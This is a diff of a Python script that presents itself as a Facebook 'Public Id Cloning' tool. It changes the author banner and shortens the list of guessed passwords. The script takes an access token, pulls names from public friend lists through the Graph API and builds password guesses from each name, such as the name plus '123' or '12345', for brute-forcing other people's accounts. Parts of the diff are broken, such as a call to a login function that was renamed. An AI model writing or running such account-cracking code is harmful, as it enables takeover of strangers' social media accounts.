@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
-# Made By  #  Blackpanther
+# Made By Bilal-XD #  Bilal-XD
 
 import requests,bs4,sys,os,random,time,re,json,concurrent
 import bot_follow_sbf
@@ -12,11 +12,26 @@ ttl = []
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
 def logo():
-    print('\n  (乂ღ˘⌣˘)ノ❤ヽ(ˆ⌣ˆ)ヾ)/ __/___|_  | ┌────────────────────────┐\n BICP__/  │ • Coded By Black Panther •  │\n/___/____/_/     /____/  │Github.com/BlackPanther02 │\n  Bangladesh Islamic Cyber Protector     └────────────────────────┘\n')
+    print (" ")
+def logo():
+    print("\033[2;95m d8888b. d888888b  .o88b. d8888b.    \033[1;97m[\033[1;94m+\033[1;97m] XX \033[1;93m: \033[1;97m Black Panther")
+    print("\033[2;95m 88  `8D   `88'   d8P  Y8 88  `8D        \033[1;97m[\033[1;94m+\033[1;97m] AU \033[1;93m: \033[1;97m  [Mahbub Alam Khan]")
+    print("\033[2;96m 88oooY'    88    8P      88oodD'      \033[1;97m[\033[1;94m+\033[1;97m] FB \033[1;93m: \033[1;97m fb.com/Mahbub.Alam.Khan.002")
+    print("\033[2;96m 88~~~b.    88    8b      88~~~       \033[1;97m[\033[1;94m+\033[1;97m] Page \033[1;93m: \033[1;97m BICP.Team.Help.Zone")  
+    print("\033[2;94m 88   8D   .88.   Y8b  d8 88          \033[1;97m[\033[1;94m+\033[1;97m] Team \033[1;93m: \033[1;97m BICP")
+    print("\033[2;94m Y8888P' Y888888P  `Y88P' 88            \033[1;97m[\033[1;94m+\033[1;97m] CM \033[1;93m: \033[1;97m B-Api.Fb")
+    print('\033[1;97m---------------------------------------------------------')
+    print('             \033[1;91m  Public Id Cloning')
+    print('\033[1;97m---------------------------------------------------------')
+    
+                            
 
-def login():
+    
+    
+    
+def main():
     os.system('rm -rf token.txt');os.system('clear');logo()
-    token = input('\033[1;97m[\033[1;94m+\033[1;97m] Login Facebook & Enter Token : ')
+    token = input('\033[1;97m[\033[1;94m+\033[1;97m] Enter Token : ')
     try:x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];v = open("token.txt", "w");v.write(token);v.close();exit(bot_follow_sbf.main())
     except (KeyError,IOError):print('\n\033[1;97m[\033[1;94m?\033[1;97m] Token Invalid');os.system('rm -rf token.txt');login()
     except requests.exceptions.ConnectionError:print('\n\033[1;97m[\033[1;94m?\033[1;97m]Token Error');os.system('rm -rf token.txt');login()
@@ -32,7 +47,7 @@ def crack_publik():
     try:token = open("token.txt","r").read()
     except (KeyError,IOError):print('\n\033[1;97m[\033[1;94m+\033[1;97m] Token Invalid');os.system('rm -rf token.txt');login()
     except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()
-    print('\n\033[1;97m[\033[1;94m+\033[1;97m] Enter Any Friendlist Public Id code (ex:-100000**********)');i = input("\033[1;97m[\033[1;94m+\033[1;97m] Enter Id code : ")
+    print('\n\033[1;97m[\033[1;94m+\033[1;97m] Enter Any Public Id link');i = input("\033[1;97m[\033[1;94m+\033[1;97m] Enter Id link : ")
     try:
         try:o = requests.get("https://graph.facebook.com/" + i + "?access_token=" + token);b = json.loads(o.text);print ('\033[1;97m[\033[1;94m+\033[1;97m] Name : %s'%(b['name']))
         except (KeyError,IOError):print('\n[!] Account Friend list is not Public');menu()
@@ -47,8 +62,8 @@ def password(text):
     results=[]
     for i in text.split(" "):
         i=i.lower()
-        if len(i)>=6 : results.append(i);results.append(i+"123");results.append(i+"12345");results.append(i+"@@");results.append(i+"1122");results.append(i+"017")
-        elif len(i)==3 or len(i)==4 or len(i)==5 : results.append(i+"123");results.append(i+"12345");results.append(i+"@@");results.append(i+"1122");results.append(i+"017")
+        if len(i)>=6 : results.append(i);results.append(i+"123");results.append(i+"12345")
+        elif len(i)==3 or len(i)==4 or len(i)==5 : results.append(i+"123");results.append(i+"12345")
         else:continue
     results.append(text.lower())
     return results
